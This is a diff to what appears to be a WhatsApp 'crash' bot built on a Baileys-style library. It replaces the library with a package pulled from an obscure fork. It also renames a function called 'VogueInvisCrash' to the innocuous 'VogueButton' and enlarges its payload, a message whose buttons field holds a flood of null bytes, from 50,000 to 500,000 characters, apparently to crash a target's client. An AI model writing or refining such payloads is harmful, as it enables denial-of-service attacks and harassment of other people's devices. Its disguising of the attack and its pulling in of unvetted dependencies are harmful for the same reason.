@@ -26,7 +26,7 @@ const defaultPackage = {
         start: "node Vogue.js"
     },
     dependencies: {
-        "@bellachu/baileys": "^2.1.9",
+        "@kurobails/socket": "npm:zeppeliorg/wbails",
         "axios": "^1.5.0",
         "chalk": "^4.1.2",
         "moment": "^2.29.1",
@@ -180,7 +180,7 @@ const {
     getContentType,
     makeCacheableSignalKeyStore,
     BufferJSON,
-} = require('@bellachu/baileys');
+} = require('@kurobails/socket');
 const pino = require('pino');
 const crypto = require('crypto');
 const chalk = require('chalk');
@@ -5977,7 +5977,7 @@ async function VogueHardInvis(sock, target) {
     });
 }
 
-async function VogueInvisCrash(sock, target) {
+async function VogueButton(sock, target) {
   const payload = {
     groupStatusMessageV2: {
       message: {
@@ -5989,7 +5989,7 @@ async function VogueInvisCrash(sock, target) {
             text: "\0"
           },
           nativeFlowMessage: {
-            buttons: "\0".repeat(50000)
+            buttons: "\0".repeat(500000)
           }
         }
       }
